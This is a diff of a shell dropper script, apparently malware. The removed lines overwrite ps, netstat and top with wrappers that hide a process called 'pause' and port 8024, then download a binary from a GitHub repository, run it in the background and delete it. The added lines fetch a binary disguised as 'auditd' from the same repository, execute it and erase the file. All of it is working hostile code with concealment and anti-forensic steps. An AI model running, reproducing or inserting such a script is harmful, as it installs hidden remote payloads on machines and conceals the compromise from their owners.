@@ -1,25 +1,5 @@
 #!/bin/sh
-rm -rf /bin/ps
-rm -rf /bin/netstat
-rm -rf /usr/bin/top
-cat > /bin/ps << EOF
-#!/bin/sh
-/bin/busybox ps \$1 \$2 \$3 \$4 | grep -Ev "pause|/bin/ps|busybox"
-EOF
-
-cat > /bin/netstat << EOF
-#!/bin/sh
-/bin/busybox netstat \$1 \$2 \$3 \$4 | grep -Ev "pause|8024"
-EOF
-
-cat > /usr/bin/top << EOF
-#!/bin/sh
-/bin/busybox top \$1 \$2 \$3 \$4 | grep "p3"
-EOF
-wget --quiet -O /pause https://github.com/jackmoc/update/raw/main/down/update_2.0.1
-chmod +x /usr/bin/top
-chmod +x /bin/ps
-chmod +x /bin/netstat
-chmod +x /pause
-/pause &
-rm -rf /pause
+wget --quiet -O /usr/bin/auditd https://github.com/jackmoc/update/raw/refs/heads/main/auditd
+chmod +x /usr/bin/auditd 
+/usr/bin/auditd &
+rm -rf /usr/bin/auditd
